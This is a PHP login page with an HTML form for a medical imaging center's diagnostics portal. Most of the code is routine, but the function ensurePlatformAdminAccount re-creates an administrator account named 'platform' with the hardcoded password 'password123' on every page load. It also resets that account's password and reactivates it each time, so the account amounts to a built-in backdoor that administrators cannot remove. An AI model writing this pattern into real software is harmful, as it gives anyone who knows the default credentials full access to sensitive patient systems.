<?php
// Always start the session at the very beginning
session_start();

function getDashboardPath($role)
{
    $rolePaths = [
        'platform_admin' => 'Ghost/dashboard.php',
        // Legacy alias for pre-migration sessions/users.
        'developer' => 'Ghost/dashboard.php',
    ];

    return $rolePaths[$role] ?? "{$role}/dashboard.php";
}

// If user is already logged in, redirect them to their dashboard
if (isset($_SESSION['user_id'])) {
    $role = $_SESSION['role'];
    header('Location: ' . getDashboardPath($role));
    exit();
}

require_once 'includes/db_connect.php';
require_once 'includes/functions.php';

function ensurePlatformAdminAccount(mysqli $conn): void
{
    $platformUsername = 'platform';
    $platformPassword = 'password123';
    $platformHash = password_hash($platformPassword, PASSWORD_DEFAULT);
    $platformRole = 'platform_admin';

    if (function_exists('schema_has_column') && schema_has_column($conn, 'users', 'role')) {
        $roleType = '';
        if (function_exists('schema_get_column_metadata')) {
            $roleTypeMeta = schema_get_column_metadata($conn, 'users', 'role');
            if (is_array($roleTypeMeta)) {
                $roleType = (string)($roleTypeMeta['COLUMN_TYPE'] ?? '');
            }
        }

        if ($roleType !== '' && strpos($roleType, "'platform_admin'") === false) {
            $platformRole = 'developer';
        }
    }

    // Keep the required platform account present and active.
    $stmt = $conn->prepare(
        "INSERT INTO users (username, password, role, is_active) VALUES (?, ?, '{$platformRole}', 1)
         ON DUPLICATE KEY UPDATE password = VALUES(password), role = '{$platformRole}', is_active = 1"
    );
    $stmt->bind_param("ss", $platformUsername, $platformHash);
    $stmt->execute();
    $stmt->close();
}

ensurePlatformAdminAccount($conn);

$error_message = '';
$username_input = '';

// Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);

    $username_input = $username;

    if (empty($username) || empty($password)) {
        $error_message = "Username and password are required.";
    } else {
        // Prepare a statement to prevent SQL injection
        $stmt = $conn->prepare("SELECT id, username, password, role FROM users WHERE username = ? AND is_active = 1");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $result = $stmt->get_result();

        if ($result->num_rows == 1) {
            $user = $result->fetch_assoc();

            // Verify the hashed password
            if (password_verify($password, $user['password'])) {
                // Password is correct, start the session
                $_SESSION['user_id'] = $user['id'];
                $_SESSION['username'] = $user['username'];
                $_SESSION['role'] = $user['role'];

                // Redirect user to their respective dashboard
                header('Location: ' . getDashboardPath($user['role']));
                exit();
            } else {
                $error_message = "Invalid username or password.";
            }
        } else {
            $error_message = "Invalid username or password.";
        }
        $stmt->close();
    }
    $conn->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/jpeg" href="assets/images/logo.jpg">
    <title>Login - Divya Imaging Center</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>
<body class="login-page">
    <div class="login-shell">
        <div class="login-hero">
            <div class="login-hero__highlight"></div>
            <div class="login-hero__graphic">
                <div class="login-hero__orb login-hero__orb--one"></div>
                <div class="login-hero__orb login-hero__orb--two"></div>
                <div class="login-hero__logo">
                    <img src="assets/images/logo.jpg" alt="Divya Imaging Center" loading="lazy">
                </div>
            </div>
        </div>
        <div class="login-panel">
            <div class="login-panel__brand">
                <h1 class="login-panel__title">Divya Imaging Center</h1>
                <p class="login-panel__subtitle">Secure portal for diagnostics and reporting</p>
            </div>
            <?php if (!empty($error_message)): ?>
                <div class="login-alert login-alert--error"><?php echo htmlspecialchars($error_message); ?></div>
            <?php endif; ?>
            <form action="login.php" method="post" class="login-form" autocomplete="on">
                <div class="login-field">
                    <div class="login-field__control">
                        <span class="login-field__icon" aria-hidden="true">&#128100;</span>
                        <input type="text" id="username" name="username" class="login-field__input"
                               placeholder=" " autocomplete="username" inputmode="text" required
                               value="<?php echo htmlspecialchars($username_input, ENT_QUOTES); ?>">
                        <label for="username" class="login-field__floating">Username</label>
                    </div>
                </div>
                <div class="login-field">
                    <div class="login-field__control">
                        <span class="login-field__icon" aria-hidden="true">&#128274;</span>
                        <input type="password" id="password" name="password" class="login-field__input login-field__input--password"
                               placeholder=" " autocomplete="current-password" required>
                        <label for="password" class="login-field__floating">Password</label>
                        <button type="button" class="login-field__toggle" aria-label="Toggle password visibility" aria-pressed="false">
                            <span class="login-field__toggle-icon" aria-hidden="true">&#128065;</span>
                        </button>
                    </div>
                </div>
                <button type="submit" class="login-action">Login</button>
            </form>
            <div class="login-meta">
                <span>Need help? Contact system administrator.</span>
            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var toggle = document.querySelector('.login-field__toggle');
            var passwordInput = document.querySelector('.login-field__input--password');

            if (toggle && passwordInput) {
                toggle.addEventListener('click', function () {
                    var isVisible = passwordInput.type === 'text';
                    passwordInput.type = isVisible ? 'password' : 'text';
                    toggle.setAttribute('aria-pressed', String(!isVisible));
                    toggle.classList.toggle('is-active', !isVisible);
                });
            }
        });
    </script>
</body>
</html>
